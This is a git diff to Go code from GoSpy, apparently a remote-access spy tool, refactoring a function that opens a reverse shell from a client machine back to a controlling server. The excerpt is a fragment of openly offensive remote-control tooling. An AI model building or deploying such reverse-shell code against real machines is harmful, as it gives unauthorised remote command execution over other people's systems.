@@ -6,7 +6,6 @@ import (
 	"github.com/psidex/GoSpy/internal/comms"
 	"github.com/psidex/GoSpy/internal/server/conman"
 	"log"
-	"net"
 	"os"
 	"os/exec"
 	"runtime"
@@ -59,23 +58,17 @@ func initiateReverseShellOut(c comms.Connection) {
 
 // ReverseShellReply starts a reverse shell from the current machine to the address of the given connection.
 func ReverseShellReply(c comms.Connection) error {
-	conn, err := net.Dial("tcp", c.GetRemoteAddr())
+	reverseShellConn, err := comms.DupeCon(c)
 	if err != nil {
+		// For this to happen something must have gone wrong on the server (or the network dropped).
 		return err
 	}
-
-	var reverseShellConn comms.Connection
-	if ec, ok := c.(comms.EncryptedConnection); ok == true {
-		reverseShellConn = comms.NewEncryptedConnection(conn, ec.GetPassword())
-	} else {
-		reverseShellConn = comms.NewPlainConnection(conn)
-	}
-
 	// If the shell proc hangs and the server quits the shell session, the client shouldn't hang as well.
 	go initiateReverseShellOut(reverseShellConn)
 	return nil
 }
 
+// ReverseShellSend starts a reverse shell with the client.
 func ReverseShellSend(man conman.ConMan) (err error) {
 	err = man.CmdCon.SendBytes([]byte("reverse-shell"))
 	if err != nil {
